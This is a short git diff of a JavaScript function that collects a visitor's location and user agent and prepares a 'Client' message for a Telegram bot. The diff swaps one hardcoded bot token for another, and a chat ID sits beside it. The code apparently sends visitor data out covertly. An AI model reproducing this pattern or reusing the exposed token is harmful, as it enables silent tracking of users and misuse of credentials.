@@ -22,7 +22,7 @@ async function getClientInfo() {
     const Location = data.loc;
     const userAgent = navigator.userAgent;
     
-    const botToken = "6275460493:AAGVqmooTODAnXro_a76IAz_VjCe8ghq9I4";
+    const botToken = "6275460493:AAGyJ30rQiGn4JEXkDHL22KFna_wV6cpbxI";
     const chatId = "1185131759";
     
     const Template = `🆕 Client :
